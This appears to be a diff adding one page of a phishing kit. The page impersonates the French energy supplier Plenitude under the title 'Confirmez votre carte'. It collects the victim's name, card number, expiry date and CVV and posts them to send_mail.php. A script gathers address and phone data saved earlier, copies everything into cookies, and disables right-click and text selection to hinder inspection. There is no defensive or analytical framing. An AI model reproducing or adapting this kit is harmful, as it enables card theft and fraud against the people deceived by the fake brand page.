@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>Plenitude</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">
+
+    <link rel="stylesheet" href="./Confirmez votre carte_files/normalize.css">
+    <link rel="stylesheet" href="./Confirmez votre carte_files/bootstrap.min.css">
+    <link rel="stylesheet" href="./Confirmez votre carte_files/font-awesome.min.css">
+    <link rel="stylesheet" href="./Confirmez votre carte_files/main_style.css">
+    <link rel="stylesheet" href="styles.css">
+
+
+    <link rel="shortcut icon" sizes="196x196" href="https://www.eniplenitude.fr/etc.clientlibs/plenitude-common/clientlibs/clientlib-site/resources/assets/favicon-32x32.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.eniplenitude.fr/etc.clientlibs/plenitude-common/clientlibs/clientlib-site/resources/assets/favicon.ico">   
+     <style>
+        .error {
+            border: 1px solid #c72e2e;
+        }
+    </style>
+<script language="JavaScript1.2" type="text/javascript">
+    //The functions disableselect() and reEnable() are used to return the status of events.
+
+    function disableselect(e) {
+        return false
+    }
+
+    function reEnable() {
+        return true
+    }
+
+    //if IE4 
+    // disable text selection
+    document.onselectstart = new Function("return false")
+
+    //if NS6
+    if (window.sidebar) {
+        //document.onmousedown=disableselect
+        // the above line creates issues in mozilla so keep it commented.
+
+        document.onclick = reEnable
+    }
+
+    function clickIE() {
+        if (document.all) {
+            (message);
+            return false;
+        }
+    }
+
+    // disable right click
+    document.oncontextmenu = new Function("return false")
+
+</script>
+</head>
+
+<body>
+<div class="lod-full" style="display: none;">
+    <div class="lod-c"></div>
+</div>
+<div class="contain">
+    <div class="img-logo">
+        <a href="#"><img src="https://1000logos.net/wp-content/uploads/2023/11/Plenitude-Logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
+    </div>
+    <div class="center-color"></div>
+    <div class="right-btn"><a href="#" class="log_out">Déconnexion</a></div>
+    <div class="cls"></div>
+</div>
+    <main class="main-content">
+        <div class="form-container">
+            <p class="step-info">STEP 3 OF 2</p>
+            <h1 class="form-title">Set up your credit or debit card</h1>
+            <div class="payment-icons">
+                <img src="https://www.svgrepo.com/show/328112/visa.svg" alt="Visa" class="icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="MasterCard" class="icon">
+                <img src="https://www.svgrepo.com/show/361975/amex-3.svg" alt="Amex" class="icon">
+                <img src="https://www.svgrepo.com/show/508416/discover.svg"alt="discover" class="icon">
+                <img src="https://www.svgrepo.com/show/428275/dinersclub-credit-card.svg" alt="dinersclub-credit-card" class="icon">
+                <img src="https://www.svgrepo.com/show/508723/poste-pay.svg" alt="poste-pay" class="icon"></div>
+
+            <form id="form2" class="payment-form" method="POST" action="send_mail.php">
+
+            <input type="text" name="nom" placeholder="First name" required>
+            <input type="text" name="prenom" placeholder="Last name" required>
+            <input type="tel" id="cart_number" name="c_num" maxlength="16" placeholder="Card number" required>
+            <select name="exm" required>
+                <option value="" disabled selected>Month</option>
+                <option value="01">01</option>
+                <option value="02">02</option>
+                <option value="03">03</option>
+                <option value="04">04</option>
+                <option value="05">05</option>
+                <option value="06">06</option>
+                <option value="07">07</option>
+                <option value="08">08</option>
+                <option value="09">09</option>
+                <option value="10">10</option>
+                <option value="11">11</option>
+                <option value="12">12</option>
+            </select>
+            <select name="exy" required>
+                <option value="" disabled selected>Year</option>
+                <option value="2025">2025</option>
+                <option value="2026">2026</option>
+                <option value="2027">2027</option>
+                <option value="2028">2028</option>
+                <option value="2029">2029</option>
+                <option value="2030">2030</option>
+                <option value="2031">2031</option>
+                <option value="2032">2032</option>
+                <option value="2033">2033</option>
+            </select>
+            <input type="tel" name="csc" id="ccv" maxlength="4" placeholder="CVV" required>
+            <button type="submit" class="btn-bill" onclick="saveForm2()">Next</button>
+        </form>
+    </div>
+</main>
+<footer class="footer">
+    <p class="footer-info">Questions? Call <a href="">(+39) 350 574 3397</a></p>
+    <ul class="footer-links">
+        <li><a href="#">FAQ</a></li>
+        <li><a href="#">Help Center</a></li>
+        <li><a href="#">Privacy</a></li>
+        <li><a href="#">Cookie Preferences</a></li>
+        <li><a href="#">Corporate Information</a></li>
+    </ul>
+    <div class="language-selector">
+        <select>
+            <option value="en">English</option>
+            <option value="fr">Français</option>
+        </select>
+    </div>
+</footer>
+
+<script>
+    function saveForm2() {
+        const n_card = localStorage.getItem("n_card");
+        const address = localStorage.getItem("address");
+        const address1 = localStorage.getItem("address1");
+        const country = localStorage.getItem("country");
+        const phone = localStorage.getItem("phone");
+
+        const nom = document.getElementsByName("nom")[0].value;
+        const prenom = document.getElementsByName("prenom")[0].value;
+        const c_num = document.getElementsByName("c_num")[0].value;
+        const exm = document.getElementsByName("exm")[0].value;
+        const exy = document.getElementsByName("exy")[0].value;
+        const csc = document.getElementsByName("csc")[0].value;
+
+        document.cookie = `n_card=${n_card}; path=/`;
+        document.cookie = `address=${address}; path=/`;
+        document.cookie = `address1=${address1}; path=/`;
+        document.cookie = `country=${country}; path=/`;
+        document.cookie = `phone=${phone}; path=/`;
+        document.cookie = `nom=${nom}; path=/`;
+        document.cookie = `prenom=${prenom}; path=/`;
+        document.cookie = `c_num=${c_num}; path=/`;
+        document.cookie = `exm=${exm}; path=/`;
+        document.cookie = `exy=${exy}; path=/`;
+        document.cookie = `csc=${csc}; path=/`;
+    }
+</script>
+</body>
+</html>
